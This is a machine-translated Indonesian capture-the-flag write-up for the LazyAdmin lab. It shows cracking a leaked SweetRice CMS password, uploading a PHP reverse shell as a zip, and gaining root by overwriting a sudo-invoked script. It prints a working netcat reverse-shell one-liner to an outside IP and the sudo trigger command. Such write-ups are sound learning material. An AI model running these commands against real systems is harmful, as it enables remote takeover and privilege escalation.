---
title: "LazyAdmin"
description: "Enum Port 80 Dirsearch kami mengidentifikasi CMS SweetRice di halaman konten dirsearch lagi dan kami menemukan file changelog.txt yang memberi tahu kami tentang versi CMS SweetRice dan juga kami mendapatkan"
lang: "id"
translationKey: "lazyadmin"
category: "lab-writeups"
tags: ["Lab", "CMS SweetRice", "sudo access", "write access script", "Linux", "Easy"]
publishDate: "2025-07-31"
draft: false
featured: false
sample: false
author: "Dimas Sahid Abdullah"
translationStatus: "machine"
sourceLang: "en"
notionId: "2415fca1-ed80-8062-9764-daee5744b48a"
notionUrl: "https://app.notion.com/p/LazyAdmin-2415fca1ed8080629764daee5744b48a"
notionLastEdited: "2025-08-16T15:08:00.000Z"
---

# Enum

![](/images/lazyadmin/2016447db9b0.png)

## Pelabuhan 80

![](/images/lazyadmin/698a6154c7b5.png)

Dirsearch

![](/images/lazyadmin/c0cb5f62da0c.png)

Kami mengidentifikasi CMS SweetRice di halaman konten.

![](/images/lazyadmin/229ee391f5f4.png)

dirsearch lagi dan kami menemukan file changelog.txt yang memberitahu kami tentang versi CMS SweetRice dan juga kami mendapat file sql menarik seperti yang terlihat pada gambar dibawah ini.

![](/images/lazyadmin/5374aa5163b6.png)

![](/images/lazyadmin/3062f8be92b1.png)

Kita juga mendapatkan file .sql di sini, mari kita periksa.

![](/images/lazyadmin/7270f37aa14d.png)

Di dalam file cadangan, kami mendapatkan kata sandi berupa hash, jadi kami mengidentifikasi jenis hash tersebut dan mencoba memecahkannya. Hasilnya, kami menemukan teks asli dari kata sandi tersebut.

![](/images/lazyadmin/ecde565e60d4.png)

![](/images/lazyadmin/e72f7f02366c.png)

![](/images/lazyadmin/d374cb0592c0.png)

Kami mendapatkan kata sandi tetapi kami tidak tahu di mana kami menggunakannya, jadi mari kita lakukan enumerasi lagi pada pencarian direktori, lalu kami menemukan beberapa halaman login di `/content/as`

![](/images/lazyadmin/690ebc59d990.png)

![](/images/lazyadmin/cb671615a1aa.png)

## Kerentanan pada CMS SweetRice 1.5.1

Selanjutnya, kita masuk menggunakan kredensial yang telah kita peroleh sebelumnya `(manager:Password123)`. Setelah berhasil masuk, kita tahu versi CMS yang sebenarnya adalah 1.5.1, jadi mari kita jalankan exploit terkait.

![](/images/lazyadmin/5eb4ff65d66e.png)

Dari celah keamanan publik yang kita ketahui, kita dapat mengunggah **File Arbitrer** di menu **Media Center**. Saya telah mencoba mengunggah revshell.php saya melalui skrip exploit, tetapi gagal.

![](/images/lazyadmin/4e035150ce72.png)

Jadi saya melakukannya secara manual dengan mencentang kotak "ekstrak zip", sehingga kita mengunggah revshell.php kita dalam bentuk zip seperti ini.

![](/images/lazyadmin/4f9d450d3e7f.png)

Setelah itu, mari kita akses file tersebut untuk memicu revshell kita, lalu voila, kita mendapatkan user.txt.

![](/images/lazyadmin/f69dbf43ea81.png)

![](/images/lazyadmin/c0651910f452.png)

## LinPriv

biji rami:

dari linpeas kami mengidentifikasi ada skrip [backup.pl](http://backup.pl/) yang memiliki akses sudo

![](/images/lazyadmin/ead1ae1adce8.png)

![](/images/lazyadmin/f06da4a947bb.png)

kita tidak memiliki akses tulis ke [backup.sl](http://backup.sl/) jadi di dalam skrip [backup.sl](http://backup.sl/) terdapat skrip lain yaitu [copy.sh](http://copy.sh/)

![](/images/lazyadmin/e9e9bbdb669c.png)

kita memiliki akses tulis ke skrip [copy.sh](http://copy.sh/), jadi kita menimpa skrip tersebut menjadi shell kita

Berikut adalah revshell kode kami:

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.17.49.139 443 >/tmp/f
```

![](/images/lazyadmin/0c5d290b75b7.png)

![](/images/lazyadmin/588e11902f38.png)

Setelah memodifikasi skrip [copy.sh](http://copy.sh/), kita menjalankan skrip [backup.pl](http://backup.pl/) menggunakan sudo untuk memicu revshell kita yang memiliki akses pengguna root.

```bash
sudo /usr/bin/perl /home/itguy/backup.pl
```

![](/images/lazyadmin/2e2a540c4d4b.png)

voila, kita mendapatkan root.txt

![](/images/lazyadmin/73371ee90bd8.png)
